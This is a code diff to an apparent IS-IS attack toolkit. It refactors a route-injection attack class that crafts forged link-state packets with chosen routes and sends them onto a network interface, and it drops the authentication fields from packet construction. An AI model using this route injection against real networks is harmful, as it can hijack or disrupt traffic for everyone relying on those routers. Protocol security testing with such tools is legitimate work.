@@ -2,6 +2,7 @@ from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
 from isis_attack.config.types import LSPConfig
 from isis_attack.core.packet import build_lsp_with_tlvs
 from isis_attack.network.sender import PacketSender
+from isis_attack.network.adapter import get_local_mac
 
 
 class RouteInjectAttack(BaseAttack):
@@ -11,7 +12,6 @@ class RouteInjectAttack(BaseAttack):
     config: LSPConfig
 
     def setup(self) -> None:
-        from isis_attack.network.adapter import get_local_mac
         self._src_mac = get_local_mac(self.config.iface)
         self._sender = PacketSender(
             iface=self.config.iface,
@@ -20,12 +20,7 @@ class RouteInjectAttack(BaseAttack):
         )
 
     def launch(self) -> AttackResult:
-        lsp_id = self.config.lsp_id
-        if not lsp_id:
-            lsp_id = f"{self.config.sys_id}.00-00"
-        from isis_attack.core.auth import AUTH_NAME_TO_CODE
-        auth_type = AUTH_NAME_TO_CODE.get(self.config.auth_type, 0)
-        auth_key = self.config.auth_key.encode() if self.config.auth_key else b""
+        lsp_id = self.config.lsp_id or f"{self.config.sys_id}.00-00"
         pkt = build_lsp_with_tlvs(
             sys_id=self.config.sys_id,
             lsp_id=lsp_id,
@@ -36,8 +31,6 @@ class RouteInjectAttack(BaseAttack):
             metric=self.config.metric,
             network_addr=self.config.network_addr,
             network_mask=self.config.network_mask,
-            auth_type=auth_type,
-            auth_key=auth_key,
         )
         ok = self._sender.send_l2(pkt)
         return AttackResult(
